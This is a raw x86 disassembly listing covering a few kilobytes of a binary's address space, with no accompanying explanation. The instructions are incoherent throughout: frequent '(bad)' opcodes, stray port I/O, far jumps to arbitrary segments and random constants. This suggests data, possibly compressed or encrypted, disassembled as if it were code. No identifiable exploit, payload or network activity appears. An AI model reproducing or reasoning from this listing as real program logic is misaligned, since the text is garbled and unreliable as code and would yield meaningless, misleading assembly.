  4254a8:	sbb    al,0xc1
  4254aa:	cdq    
  4254ab:	int3   
  4254ac:	add    DWORD PTR [eax],eax
  4254ae:	std    
  4254af:	add    DWORD PTR [eax],eax
  4254b1:	add    bh,dh
  4254b3:	inc    eax
  4254b4:	outs   dx,DWORD PTR ds:[esi]
  4254b5:	and    bh,BYTE PTR [edx+eiz*2+0x7b28ee1d]
  4254bc:	rol    dl,1
  4254be:	and    ebx,edx
  4254c0:	mov    bh,BYTE PTR [edi]
  4254c2:	jb     0x4254f1
  4254c4:	and    ch,0xef
  4254c7:	jbe    0x4254d9
  4254c9:	int3   
  4254ca:	js     0x4254b6
  4254cc:	es mov bl,0x72
  4254cf:	fld    QWORD PTR [ebx+eiz*2]
  4254d2:	aad    0xcc
  4254d4:	jg     0x4254a5
  4254d6:	dec    ebx
  4254d7:	es pop ebp
  4254d9:	jge    0x42549a
  4254db:	pop    edi
  4254dc:	push   cs
  4254dd:	jno    0x425559
  4254df:	daa    
  4254e0:	fnstsw WORD PTR [edi+0xa]
  4254e3:	jmp    0xed42:0x19c8ab6d
  4254ea:	fisttp DWORD PTR [esi+ecx*2]
  4254ed:	cli    
  4254ee:	inc    edi
  4254ef:	and    eax,0x85d1e5d9
  4254f4:	sbb    DWORD PTR [ebx],edx
  4254f6:	jg     0x42556c
  4254f8:	ficom  DWORD PTR [edx+ebp*2-0x6506d251]
  4254ff:	pop    eax
  425500:	pop    es
  425501:	lahf   
  425502:	xlat   BYTE PTR ds:[ebx]
  425503:	sbb    ebp,DWORD PTR [edi+edi*2]
  425506:	(bad)  
  425507:	repz test al,0xb
  42550a:	test   eax,0xd8946029
  42550f:	sar    dh,1
  425511:	out    0xe1,al
  425513:	cmp    al,BYTE PTR [esi]
  425515:	ss push edx
  425517:	ret    0xa56b
  42551a:	lea    esi,[ecx]
  42551c:	loope  0x425525
  42551e:	cmp    DWORD PTR [ecx-0x6bf41deb],esi
  425524:	popa   
  425525:	or     DWORD PTR [eax+eax*1-0x5746fed],ebp
  42552c:	mov    esi,0x5f7574bf
  425531:	xor    esp,esi
  425533:	mov    esi,0x3edb22d5
  425538:	les    ecx,FWORD PTR [ebx+0x5b]
  42553b:	xchg   BYTE PTR [edi-0x29],ch
  42553e:	xchg   ebx,eax
  42553f:	xor    al,BYTE PTR [esp+ecx*4+0x61]
  425543:	popa   
  425544:	jl     0x4255ba
  425546:	or     al,BYTE PTR [ecx]
  425548:	add    bh,ah
  42554a:	popa   
  42554b:	mov    dh,0x78
  42554d:	sub    BYTE PTR [eax-0x1d],bl
  425550:	neg    BYTE PTR [eax+0x57]
  425553:	scas   eax,DWORD PTR es:[edi]
  425554:	cmp    BYTE PTR [edi-0x1ad60f49],dl
  42555a:	je     0x4254fb
  42555c:	jge    0x4254f8
  42555e:	or     bh,ch
  425560:	sbb    DWORD PTR ds:0x279b35fa,edx
  425566:	push   esp
  425567:	lahf   
  425568:	inc    ebp
  425569:	xor    BYTE PTR [ecx-0x3cc8ba18],0x1b
  425570:	dec    esi
  425571:	mov    ebp,0xb6592dc9
  425576:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  425578:	inc    edi
  425579:	ficomp WORD PTR [esi+0x4ae8e97c]
  42557f:	test   eax,0x4750e809
  425584:	into   
  425585:	ins    DWORD PTR es:[edi],dx
  425586:	inc    edi
  425587:	lods   eax,DWORD PTR ds:[esi]
  425588:	xlat   BYTE PTR ds:[ebx]
  425589:	ror    bl,cl
  42558b:	test   DWORD PTR [ebp-0x100e540d],0x94d5981d
  425595:	mov    ebx,esi
  425597:	xchg   esi,eax
  425598:	arpl   WORD PTR [esi-0x59],ax
  42559b:	add    al,0xfe
  42559d:	aam    0xf9
  42559f:	dec    ebp
  4255a0:	dec    BYTE PTR [ebp-0x5e4d6f89]
  4255a6:	mov    bl,0xa
  4255a8:	jmp    0x1d0e:0x92f0bd92
  4255af:	cmp    ebp,0x45da35dd
  4255b5:	dec    ecx
  4255b6:	test   eax,0xaef48742
  4255bb:	sub    ebp,DWORD PTR [ecx+0x19]
  4255be:	leave  
  4255bf:	scas   al,BYTE PTR es:[edi]
  4255c0:	es pop ebx
  4255c2:	mov    al,ds:0xd4a1114f
  4255c7:	pop    es
  4255c8:	sahf   
  4255c9:	mov    esp,DWORD PTR [eax]
  4255cb:	adc    DWORD PTR [edi+0x58],0x2c6f9575
  4255d2:	imul   BYTE PTR [eax]
  4255d4:	or     edx,DWORD PTR [esi*2-0x6ae7bf8e]
  4255db:	imul   ebp,ebp,0xe294d544
  4255e1:	fucomp st(3)
  4255e3:	push   cs
  4255e4:	aam    0x3d
  4255e6:	mov    ah,0xcb
  4255e8:	shl    BYTE PTR [ecx-0x6b],0xb8
  4255ec:	jns    0x42562a
  4255ee:	mov    eax,ds:0xd9a3e3f7
  4255f3:	xor    DWORD PTR [eax-0x1172309a],ecx
  4255f9:	ins    BYTE PTR es:[edi],dx
  4255fa:	bound  edi,QWORD PTR [esi-0x2a65e8e6]
  425600:	fld    QWORD PTR ds:0x950551b2
  425606:	dec    edx
  425607:	leave  
  425608:	add    dl,BYTE PTR [esi-0x3408ba51]
  42560e:	jnp    0x425622
  425610:	(bad)  
  425611:	imul   ebx,DWORD PTR [eax-0x25],0xa30682ee
  425618:	lahf   
  425619:	mov    ds:0xe4f9855e,al
  42561e:	xor    BYTE PTR [esp-0x2f],bl
  425622:	xor    esi,DWORD PTR [edx-0x3ee3da5c]
  425628:	js     0x4255cc
  42562a:	inc    edx
  42562b:	out    0x2f,al
  42562d:	mov    edi,ebx
  42562f:	pop    esp
  425630:	fdiv   QWORD PTR [eax+0x7ba25df5]
  425636:	add    DWORD PTR [edi],esi
  425638:	fbld   TBYTE PTR [ebx]
  42563a:	jno    0x4255c6
  42563c:	or     BYTE PTR [edx-0x6c],bh
  42563f:	repnz sub dh,BYTE PTR [eax+0x44ea1738]
  425646:	shr    BYTE PTR [eax],0xed
  425649:	inc    edx
  42564a:	and    al,0xc4
  42564c:	out    0xe5,al
  42564e:	mov    BYTE PTR [ebx-0x46e8d13a],cl
  425654:	cld    
  425655:	stc    
  425656:	jl     0x42566a
  425658:	xlat   BYTE PTR ds:[ebx]
  425659:	pop    edi
  42565a:	mov    bh,0x21
  42565c:	daa    
  42565d:	inc    edx
  42565e:	cmc    
  42565f:	jge    0x42563e
  425661:	sbb    eax,0x3be77f68
  425666:	and    DWORD PTR [eax-0x1ff99576],ebx
  42566c:	les    edx,FWORD PTR [edi-0x33114179]
  425672:	add    DWORD PTR [ebx-0xc],eax
  425675:	xchg   esp,eax
  425676:	add    al,0xa0
  425678:	loop   0x425670
  42567a:	ins    BYTE PTR es:[edi],dx
  42567b:	pop    edi
  42567c:	cmp    ah,cl
  42567e:	test   ebx,esi
  425680:	out    dx,eax
  425681:	push   eax
  425682:	rcl    bl,1
  425684:	jecxz  0x4256fb
  425686:	cmp    al,0x3c
  425688:	xor    dl,BYTE PTR [ebx-0x1e]
  42568b:	enter  0xd944,0x93
  42568f:	(bad)  
  425690:	mov    ah,0x9c
  425692:	sahf   
  425693:	inc    ebp
  425694:	mov    edx,0xcf9c418c
  425699:	cmc    
  42569a:	ficomp DWORD PTR [edi]
  42569c:	popf   
  42569d:	jmp    0x425672
  42569f:	(bad)  
  4256a0:	or     eax,0xdda0b176
  4256a5:	xor    eax,0xf25f0db
  4256aa:	mov    BYTE PTR [esi+0x5d],dh
  4256ad:	or     ebx,DWORD PTR [eax+eax*1]
	...
  4256b8:	add    BYTE PTR [eax],al
  4256ba:	mov    esi,0x74ef74ea
  4256bf:	(bad)  
  4256c0:	mov    edi,0x93a446fb
  4256c5:	nop
  4256c6:	jecxz  0x425734
  4256c8:	repnz fist WORD PTR [esi-0x2fffe32]
  4256cf:	add    DWORD PTR [eax],eax
  4256d1:	add    ah,ch
  4256d3:	je     0x425741
  4256d5:	mov    bl,0x56
  4256d7:	ret    
  4256d8:	sbb    BYTE PTR [esi-0x6b],ch
  4256db:	xlat   BYTE PTR ds:[ebx]
  4256dc:	sub    bh,ah
  4256de:	in     al,0x48
  4256e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4256e1:	sti    
  4256e2:	jmp    0xe812a826
  4256e7:	adc    esp,ebp
  4256e9:	fsub   st(3),st
  4256eb:	sbb    al,BYTE PTR [bp+di-0x14]
  4256ef:	in     al,0x47
  4256f1:	pop    es
  4256f2:	mov    eax,ds:0x26da4848
  4256f7:	xchg   DWORD PTR [edi+0x4e60b675],ebx
  4256fd:	mov    ?,WORD PTR [edx+eiz*2]
  425700:	inc    ebp
  425701:	(bad)  
  425702:	outs   dx,BYTE PTR ds:[esi]
  425703:	sub    BYTE PTR [eax],dl
  425705:	push   cs
  425706:	arpl   ax,sp
  425708:	fucom  st(1)
  42570a:	adc    al,0xf5
  42570c:	les    ebx,FWORD PTR [esi+0x1d]
  42570f:	adc    al,0x5f
  425711:	arpl   WORD PTR [edi+0x2e],sp
  425714:	push   ss
  425715:	in     al,dx
  425716:	xchg   DWORD PTR [eax+0x19],edx
  425719:	out    dx,eax
  42571a:	fwait
  42571b:	and    al,0xf3
  42571d:	sub    al,0x66
  42571f:	jns    0x42578f
  425721:	jle    0x42573a
  425723:	ja     0x42570f
  425725:	adc    al,BYTE PTR [eax-0x6917f635]
  42572b:	pop    ss
  42572c:	add    esp,0x93d0e885
  425732:	loop   0x425748
  425734:	jne    0x42572d
  425736:	mov    BYTE PTR [eax],0x62
  425739:	cwde   
  42573a:	ja     0x425739
  42573c:	fld    TBYTE PTR [eax+0x3eab4815]
  425742:	adc    BYTE PTR [eax],ah
  425744:	js     0x4256e6
  425746:	fbld   TBYTE PTR [esi-0x3c]
  425749:	add    BYTE PTR [ebx+eiz*4-0x4b],al
  42574d:	jle    0x425756
  42574f:	inc    esp
  425750:	cmp    cl,dh
  425752:	mov    ds:0xf8dde72a,al
  425757:	pop    ecx
  425758:	inc    ecx
  425759:	mov    eax,0xf6dabb19
  42575e:	and    al,0x94
  425760:	cdq    
  425761:	lods   eax,DWORD PTR ds:[esi]
  425762:	out    dx,al
  425763:	popf   
  425764:	out    dx,al
  425765:	stos   BYTE PTR es:[edi],al
  425766:	lahf   
  425767:	retf   0xe14b
  42576a:	adc    BYTE PTR es:[ebx],cl
  42576d:	cmp    DWORD PTR ds:0x297f0009,esp
  425773:	jp     0x4257c5
  425775:	(bad)  
  425776:	cs jb  0x425780
  425779:	and    BYTE PTR [esi-0x3e],cl
  42577c:	add    eax,0x85f8cecc
  425781:	pop    esi
  425782:	mov    ebx,0xe66738b0
  425787:	fcomp  DWORD PTR [edx-0x51a6bbcb]
  42578d:	idiv   BYTE PTR [esi+0x777a424a]
  425793:	push   0xc2cbd476
  425798:	outs   dx,DWORD PTR es:[esi]
  42579a:	rol    BYTE PTR ds:0x6dc13521,cl
  4257a0:	mov    DWORD PTR [esi],eax
  4257a2:	pop    edi
  4257a3:	ret    
  4257a4:	xlat   BYTE PTR ds:[ebx]
  4257a5:	repz cli 
  4257a7:	ret    0x7703
  4257aa:	adc    al,0xd
  4257ac:	nop
  4257ad:	in     eax,0xdc
  4257af:	mov    ebp,0xd3775265
  4257b4:	fs out dx,eax
  4257b6:	push   cs
  4257b7:	(bad)  
  4257b8:	std    
  4257b9:	adc    ebx,DWORD PTR [edi-0x34]
  4257bc:	das    
  4257bd:	pop    esp
  4257be:	stos   BYTE PTR es:[edi],al
  4257bf:	les    ebp,FWORD PTR [edx]
  4257c1:	lods   eax,DWORD PTR ds:[esi]
  4257c2:	loopne 0x425834
  4257c4:	(bad)  
  4257c5:	and    BYTE PTR [eax+ebp*2],ah
  4257c8:	outs   dx,DWORD PTR ds:[esi]
  4257c9:	or     esp,DWORD PTR [eax]
  4257cb:	mov    al,0x9
  4257cd:	dec    esi
  4257ce:	lahf   
  4257cf:	pop    esp
  4257d0:	push   ebx
  4257d1:	sbb    al,0xfa
  4257d3:	xlat   BYTE PTR ds:[ebx]
  4257d4:	lds    eax,FWORD PTR [esi-0x3]
  4257d7:	or     DWORD PTR [edx-0x9],ebp
  4257da:	aaa    
  4257db:	jp     0x425807
  4257dd:	fs add esi,eax
  4257e0:	iret   
  4257e1:	in     eax,0xb6
  4257e3:	(bad)  
  4257e4:	lea    edx,[eax+0x0]
  4257e7:	mov    ebx,0x261379e4
  4257ec:	inc    esi
  4257ed:	(bad)  
  4257ee:	sub    eax,0xf4364ce9
  4257f3:	jno    0x4257fa
  4257f5:	sub    BYTE PTR [ebp+0x4f332835],0x67
  4257fc:	or     BYTE PTR [esi+0xf0455d1],dh
  425802:	push   ds
  425803:	outs   dx,DWORD PTR ds:[esi]
  425804:	ror    BYTE PTR [esp+edi*1-0x4e77955],1
  42580b:	into   
  42580c:	retf   0x2515
  42580f:	rcl    BYTE PTR [ebp+0x65],1
  425812:	icebp  
  425813:	ret    0x92ec
  425816:	or     DWORD PTR [eax],esi
  425818:	ins    BYTE PTR es:[edi],dx
  425819:	test   eax,0x7ab6365f
  42581e:	mov    eax,0x1b97ef65
  425823:	or     ebx,0x2dc3eb94
  425829:	adc    al,0xc1
  42582b:	outs   dx,DWORD PTR ds:[esi]
  42582c:	mov    bl,BYTE PTR [edi+0x6c]
  42582f:	xor    BYTE PTR [eax-0x3cd68668],dl
  425835:	xor    BYTE PTR [edi],ch
  425837:	xchg   ecx,eax
  425838:	dec    esp
  425839:	fwait
  42583a:	push   edx
  42583b:	out    dx,al
  42583c:	xor    BYTE PTR [ebp-0x7e],dh
  42583f:	fistp  QWORD PTR [edx+edi*8+0x2d]
  425843:	push   eax
  425844:	mov    bl,0x8e
  425846:	pop    ebx
  425847:	mov    bh,0xc8
  425849:	cmp    edi,ebp
  42584b:	dec    edx
  42584c:	add    eax,0xa71aa990
  425851:	push   ds
  425852:	sub    dl,bh
  425854:	fs push ds
  425856:	push   ecx
  425857:	and    dl,BYTE PTR [ecx-0x6e8164be]
  42585d:	je     0x42584b
  42585f:	lods   al,BYTE PTR ds:[esi]
  425860:	or     bh,BYTE PTR [edx+0xa]
  425863:	je     0x425851
  425865:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425866:	sahf   
  425867:	fadd   st(5),st
  425869:	pusha  
  42586a:	jmp    DWORD PTR [edi]
  42586c:	pop    ebp
  42586d:	adc    BYTE PTR [ecx],al
  42586f:	sti    
  425870:	pop    edx
  425871:	add    ah,BYTE PTR ds:0x7865e15b
  425877:	cld    
  425878:	sub    BYTE PTR [ecx-0x55],ah
  42587b:	fcom   QWORD PTR [esi]
  42587d:	and    eax,0x75751724
  425882:	imul   BYTE PTR [ebx-0x69de97c9]
  425888:	jge    0x4258f3
  42588a:	call   0x3e78:0x14304286
  425891:	add    ah,ch
  425893:	lahf   
  425894:	sub    al,0x2c
  425896:	push   ebp
  425897:	call   DWORD PTR [esp+edx*2-0x378bbd28]
  42589e:	push   ecx
  42589f:	sbb    al,0x12
  4258a1:	(bad)  
  4258a2:	out    dx,al
  4258a3:	sub    BYTE PTR [ecx+0x18710440],bl
  4258a9:	pop    ebx
  4258aa:	xchg   esi,eax
  4258ab:	bound  ebx,QWORD PTR [esi+0xa55620a]
  4258b1:	jl     0x42592f
  4258b3:	and    ebp,edi
  4258b5:	loop   0x4258dc
  4258b7:	and    eax,0x81c503bd
  4258bc:	pushf  
  4258bd:	jmp    0x7f58:0x82d84b8a
  4258c4:	jg     0x42591e
  4258c6:	imul   edx,DWORD PTR [ecx+0x3ae3c96a],0xc42ea0
	...
  4258d8:	add    BYTE PTR [eax],al
  4258da:	dec    ebx
  4258db:	inc    ebp
  4258dc:	mov    edx,0x5fffbeee
  4258e1:	in     eax,0xe9
  4258e3:	dec    esi
  4258e4:	cmp    ch,ah
  4258e6:	sub    cl,BYTE PTR [edx]
  4258e8:	sbb    BYTE PTR [eax],bh
  4258ea:	xchg   ebx,eax
  4258eb:	rol    BYTE PTR [ecx],1
  4258ed:	add    ch,bh
  4258ef:	add    DWORD PTR [eax],eax
  4258f1:	add    BYTE PTR [ebx],ch
  4258f3:	adc    eax,0x406d9a58
  4258f8:	jnp    0x4258a6
  4258fa:	inc    eax
  4258fb:	xchg   ebp,eax
  4258fc:	mov    ecx,DWORD PTR [eax+0x51]
  4258ff:	dec    ebx
  425900:	xchg   BYTE PTR [eax],bl
  425902:	fsubr  DWORD PTR [ecx-0x4a]
  425905:	sbb    BYTE PTR [esi+0x6e],bl
  425908:	push   eax
  425909:	inc    esi
  42590a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42590b:	and    ebx,DWORD PTR [eax-0x430ed6f8]
  425911:	arpl   WORD PTR [ecx+0x60fc9282],si
  425917:	repnz xor bh,BYTE PTR [esi+0x4ee46e46]
  42591e:	loopne 0x42596b
  425920:	int3   
  425921:	clc    
  425922:	pop    ebp
  425923:	xchg   DWORD PTR [eax-0x5a],ebx
  425926:	in     eax,0x79
  425928:	inc    edi
  425929:	arpl   sp,cx
  42592b:	and    ebx,ebp
  42592d:	pop    ebx
  42592e:	xor    BYTE PTR [edx+0x41055147],0x27
  425935:	jle    0x42595a
  425937:	lea    eax,[eax]
  425939:	repnz leave 
  42593b:	out    0x67,al
  42593d:	std    
  42593e:	dec    edx
  42593f:	stc    
  425940:	lds    ebp,FWORD PTR [eax-0x1d]
  425943:	push   edx
  425944:	push   ds
  425945:	and    al,0xfc
  425947:	lahf   
  425948:	sub    eax,0x528772a4
  42594d:	inc    edi
  42594e:	lea    eax,[ecx]
  425950:	aas    
  425951:	retf   
  425952:	(bad)  
  425953:	fbstp  TBYTE PTR [eax-0x30b11a13]
  425959:	pop    edi
  42595a:	inc    edx
  42595b:	push   eax
  42595c:	inc    ebp
  42595d:	gs inc esp
  42595f:	add    esp,DWORD PTR [edi-0x18fef546]
  425965:	icebp  
  425966:	sub    DWORD PTR [eax-0x228bb2],ebx
  42596c:	xor    eax,0x6eb94282
  425971:	mov    ebx,0x91c516f0
  425976:	adc    eax,0xcc61fbf5
  42597b:	or     DWORD PTR [edx+0x36],ecx
  42597e:	jecxz  0x425976
  425980:	jb     0x425988
  425982:	add    cl,BYTE PTR [edx-0x2c0bd89c]
  425988:	sub    cl,BYTE PTR [ecx-0x14f6d744]
  42598e:	arpl   bp,bp
  425990:	sub    ecx,DWORD PTR [esi-0x76]
  425993:	test   al,0x80
  425995:	fimul  WORD PTR [ebx-0xd]
  425998:	jecxz  0x425990
  42599a:	and    eax,0xa92249e8
  42599f:	or     eax,0xf444df4e
  4259a4:	cld    
  4259a5:	pop    ebp
  4259a6:	lods   eax,DWORD PTR ds:[esi]
  4259a7:	mov    cl,0x5b
  4259a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259aa:	pop    ebp
  4259ab:	mov    dh,BYTE PTR [edx]
  4259ad:	popa   
  4259ae:	push   ebx
  4259af:	sub    eax,0x1cedf67f
  4259b4:	dec    ebx
  4259b5:	stc    
  4259b6:	in     al,dx
  4259b7:	fwait
  4259b8:	ret    
  4259b9:	(bad)  
  4259ba:	xor    BYTE PTR [ebx+eiz*1+0x4e9ddcd1],dl
  4259c1:	pushf  
  4259c2:	lea    esp,[esi-0x72]
  4259c5:	pop    esi
  4259c6:	pop    ebp
  4259c7:	inc    esi
  4259c8:	adc    DWORD PTR [edx+0xc],eax
  4259cb:	into   
  4259cc:	xchg   ebx,eax
  4259cd:	add    DWORD PTR [esi-0x7a11cc70],edx
  4259d3:	fs je  0x425a54
  4259d6:	pandn  mm1,QWORD PTR [edx]
  4259d9:	xchg   edi,eax
  4259da:	jmp    0x37067761
  4259df:	pop    eax
  4259e0:	ret    0x1b2e
  4259e3:	jp     0x425a3b
  4259e5:	xor    ebp,DWORD PTR [edi-0x56a786b5]
  4259eb:	and    al,0x80
  4259ed:	jmp    0x74d2:0x552f99b3
  4259f4:	xor    ebp,ebx
  4259f6:	mov    al,0xb4
  4259f8:	add    BYTE PTR [esi],bh
  4259fa:	fwait
  4259fb:	std    
  4259fc:	je     0x425a1e
  4259fe:	push   esi
  4259ff:	fstp   st(3)
  425a01:	xchg   edi,eax
  425a02:	sbb    edx,DWORD PTR [esi]
  425a04:	cmp    al,0x26
  425a06:	sbb    edx,DWORD PTR ds:0xf8184367
  425a0c:	das    
  425a0d:	mov    ah,0x90
  425a0f:	imul   edi,DWORD PTR [ebp-0x68],0xffffffda
  425a13:	(bad)  
  425a14:	fstp   QWORD PTR [esi+0x2011c2af]
  425a1a:	test   bl,0xeb
  425a1d:	cmp    esi,0xd4f5d5f8
  425a23:	add    al,0x6d
  425a25:	mov    dh,0xc7
  425a27:	inc    DWORD PTR [ebp+ecx*4+0x1b3a717c]
  425a2e:	push   0x70b1e9d6
  425a33:	xchg   esp,eax
  425a34:	jae    0x425a5e
  425a36:	jl     0x4259cd
  425a38:	test   eax,0x3a7d80f1
  425a3d:	out    0xa5,al
  425a3f:	pushf  
  425a40:	xchg   edx,eax
  425a41:	ficomp WORD PTR [ecx+0x464c11f7]
  425a47:	dec    edx
  425a48:	push   esi
  425a49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a4a:	test   DWORD PTR [ebp+edi*8+0x66],eax
  425a4e:	call   0xe70:0xc58a3cd5
  425a55:	adc    DWORD PTR [edx],ebx
  425a57:	out    dx,eax
  425a58:	fld    TBYTE PTR [edx]
  425a5a:	adc    DWORD PTR [ecx+0x22249de8],ecx
  425a60:	cmc    
  425a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a62:	out    0xfb,al
  425a64:	test   al,0x35
  425a66:	outs   dx,DWORD PTR ds:[esi]
  425a67:	and    al,0x1
  425a69:	outs   dx,DWORD PTR ds:[esi]
  425a6a:	retf   
  425a6b:	cmp    BYTE PTR [ebp-0x4d5c085d],ah
  425a71:	and    DWORD PTR [edx],0x41f01e26
  425a77:	ss cs fxch st(2)
  425a7b:	imul   eax,DWORD PTR [ebp-0x1d],0x751b34c2
  425a82:	mov    WORD PTR [ebx-0x4b339b60],ds
  425a88:	aaa    
  425a89:	and    ecx,0x49
  425a8c:	or     BYTE PTR [edx-0x243f616c],bh
  425a92:	push   ebp
  425a93:	pop    esi
  425a94:	sub    eax,0x486aa86f
  425a99:	dec    ecx
  425a9a:	and    DWORD PTR [esi],esp
  425a9c:	int    0x8
  425a9e:	pop    esp
  425a9f:	popf   
  425aa0:	and    al,0x70
  425aa2:	sbb    bh,bh
  425aa4:	add    BYTE PTR [edi-0x520e0732],al
  425aaa:	fst    QWORD PTR [ecx+0x5d]
  425aad:	mov    ds:0x490c1787,eax
  425ab2:	mov    esp,0xfe9c3f39
  425ab7:	arpl   cx,cx
  425ab9:	retf   
  425aba:	push   ebx
  425abb:	lock out 0x80,eax
  425abe:	imul   esi,DWORD PTR [ebp+0x15],0xd6881f9
  425ac5:	sahf   
  425ac6:	xchg   esi,eax
  425ac7:	test   al,0x57
  425ac9:	fstp   DWORD PTR [eax+0x3662c50f]
  425acf:	pop    edx
  425ad0:	imul   edi,DWORD PTR gs:[edi+0x228a1aa1],0xdc94575d
  425adb:	cmp    al,0x7c
  425add:	(bad)  
  425ade:	jmp    0x337cba12
  425ae3:	dec    edi
  425ae4:	cmp    eax,0xad7cb374
  425ae9:	popf   
  425aea:	jns    0x425aac
  425aec:	retf   
  425aed:	div    BYTE PTR [eax+eax*1+0x0]
	...
  425af9:	add    BYTE PTR [edx-0x5b61f90],ch
  425aff:	fldcw  WORD PTR [ebx+0x2d6367f3]
  425b05:	(bad)  
  425b06:	xchg   ebp,eax
  425b07:	out    0xbc,al
  425b09:	adc    DWORD PTR [eax-0x2fffe2e],0x1
  425b10:	add    BYTE PTR [eax],al
  425b12:	xor    BYTE PTR [eax],cl
  425b14:	(bad)  
  425b15:	arpl   WORD PTR [ebx-0x32a22080],cx
  425b1b:	adc    DWORD PTR [ecx],edx
  425b1d:	cwde   
  425b1e:	loope  0x425b95
  425b20:	xchg   esi,eax
  425b21:	adc    dl,0x1f
  425b24:	outs   dx,DWORD PTR ds:[esi]
  425b25:	xchg   BYTE PTR [esi],al
  425b27:	call   0x92f8:0x4694aab3
  425b2e:	mov    dl,0x8d
  425b30:	arpl   WORD PTR [ebx+0x165a7ed3],dx
  425b36:	pop    ecx
  425b37:	and    eax,0xc3dc8238
  425b3c:	rol    DWORD PTR [eax+esi*2+0x3350a2e6],1
  425b43:	les    ebx,FWORD PTR [esi+ebx*1+0x62]
  425b47:	lods   eax,DWORD PTR ds:[esi]
  425b48:	pop    ss
  425b49:	sub    DWORD PTR [ebx+edi*8],ecx
  425b4c:	xor    esp,DWORD PTR [edi]
  425b4e:	outs   dx,BYTE PTR ds:[esi]
  425b4f:	push   ss
  425b50:	punpcklwd mm4,DWORD PTR [esi+0x7]
  425b54:	xchg   esi,eax
  425b55:	mov    ch,0xdd
  425b57:	out    0x91,al
  425b59:	shr    DWORD PTR [ebx+eax*2-0xc],1
  425b5d:	xchg   esi,eax
  425b5e:	sub    al,cl
  425b60:	leave  
  425b61:	rol    DWORD PTR ds:0xaa0f3e82,cl
  425b67:	inc    esi
  425b68:	mov    dl,0xa5
  425b6a:	sub    eax,DWORD PTR [ebx-0x67]
  425b6d:	fbstp  TBYTE PTR [esp+ebx*4-0x56]
  425b71:	fwait
  425b72:	push   ebx
  425b73:	or     edi,DWORD PTR [eax]
  425b75:	mov    bl,0x68
  425b77:	rol    DWORD PTR [edi],0x4e
  425b7a:	xchg   esi,eax
  425b7b:	jmp    FWORD PTR [ebx+0x6bb1eae]
  425b81:	xchg   edx,eax
  425b82:	push   0xd7e81f18
  425b87:	ror    BYTE PTR [ebp-0x54],0x39
  425b8b:	push   ss
  425b8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b8d:	jns    0x425b38
  425b8f:	mov    ch,0xb2
  425b91:	and    bh,0x60
  425b94:	mov    bl,BYTE PTR [edi+0x6528a6d9]
  425b9a:	pop    ss
  425b9b:	ror    BYTE PTR [edx-0x3a359fef],cl
  425ba1:	mov    cl,0x77
  425ba3:	cwde   
  425ba4:	mov    BYTE PTR [ecx-0x2e0c1f35],bl
  425baa:	mov    DWORD PTR [eax-0x75],edx
  425bad:	push   edx
  425bae:	adc    eax,0x2ee77186
  425bb3:	cmp    al,0xa0
  425bb5:	and    al,0x31
  425bb7:	sar    eax,0x58
  425bba:	dec    DWORD PTR [esi]
  425bbc:	mov    bh,0x87
  425bbe:	sbb    DWORD PTR [ebp+0x2c],0xf69a7f63
  425bc5:	dec    ecx
  425bc6:	mov    cl,bh
  425bc8:	adc    edx,DWORD PTR [ebx]
  425bca:	pop    es
  425bcb:	scas   eax,DWORD PTR es:[edi]
  425bcc:	clc    
  425bcd:	inc    ecx
  425bce:	push   0x9
  425bd0:	jne    0x425b78
  425bd2:	cmp    al,BYTE PTR [edx-0x5bafc876]
  425bd8:	cwde   
  425bd9:	das    
  425bda:	(bad)  
  425bdb:	cli    
  425bdc:	addr16 inc ecx
  425bde:	loop   0x425b70
  425be0:	(bad)  
  425be1:	and    eax,0xbc17f277
  425be6:	pusha  
  425be7:	xchg   ebp,eax
  425be8:	sbb    al,0x27
  425bea:	repnz sub DWORD PTR [ecx],ebp
  425bed:	cdq    
  425bee:	or     al,0x97
  425bf0:	jecxz  0x425b98
  425bf2:	in     eax,dx
  425bf3:	pop    esi
  425bf4:	add    ah,BYTE PTR [ebx]
  425bf6:	fild   WORD PTR [ebx]
  425bf8:	xchg   ebx,eax
  425bf9:	(bad)  
  425bfb:	mov    WORD PTR [ebx+0x4a96bfb4],ds
  425c01:	test   ch,al
  425c03:	and    al,0x9d
  425c05:	sub    al,0x4e
  425c07:	mov    ds:0xb74452de,al
  425c0c:	bound  eax,QWORD PTR [edx]
  425c0e:	mov    eax,0x6e8ff4a7
  425c13:	imul   esi,esi,0xffffffff
  425c16:	repnz push eax
  425c18:	stos   DWORD PTR es:[edi],eax
  425c19:	pop    edi
  425c1a:	dec    ebp
  425c1b:	fwait
  425c1c:	cld    
  425c1d:	xchg   ebp,ebx
  425c1f:	lods   al,BYTE PTR ds:[esi]
  425c20:	sti    
  425c21:	call   0x1f56:0xf247a606
  425c28:	jecxz  0x425c95
  425c2a:	pop    es
  425c2b:	push   edi
  425c2c:	cmp    ah,al
  425c2e:	xchg   BYTE PTR [edx],ch
  425c30:	jae    0x425c16
  425c32:	pop    edi
  425c33:	xor    BYTE PTR [edx-0x34],0xb
  425c37:	sub    esi,ebp
  425c39:	leave  
  425c3a:	(bad)  
  425c3b:	out    dx,al
  425c3c:	aam    0x38
  425c3e:	imul   eax,DWORD PTR [ebp+0x6f],0xadd9528d
  425c45:	nop
  425c46:	ja     0x425bd2
  425c48:	jno    0x425bfb
  425c4a:	adc    dl,ch
  425c4c:	test   BYTE PTR [esp+esi*8+0x48],0xa3
  425c51:	push   0xdfecaba2
  425c56:	scas   al,BYTE PTR es:[edi]
  425c57:	and    esi,DWORD PTR [esi+0x6b]
  425c5a:	sbb    eax,0xee0167bd
  425c5f:	inc    edi
  425c60:	mov    esi,0x2abbc7c3
  425c65:	inc    edi
  425c66:	(bad)  
  425c67:	push   ebx
  425c68:	(bad)  
  425c69:	bt     DWORD PTR [ebx-0x38a49266],edx
  425c70:	loopne 0x425c37
  425c72:	sbb    DWORD PTR [eax+0x4a],esp
  425c75:	ss inc ebx
  425c77:	int3   
  425c78:	cmp    al,0xfc
  425c7a:	jns    0x425c28
  425c7c:	and    eax,0x60e11abc
  425c81:	push   es
  425c82:	mul    BYTE PTR [ebp+0x19d77e25]
  425c88:	leave  
  425c89:	jg     0x425cdb
  425c8b:	jl     0x425ce8
  425c8d:	adc    ebx,ebx
  425c8f:	js     0x425c17
  425c91:	out    dx,al
  425c92:	mov    BYTE PTR [edx],bh
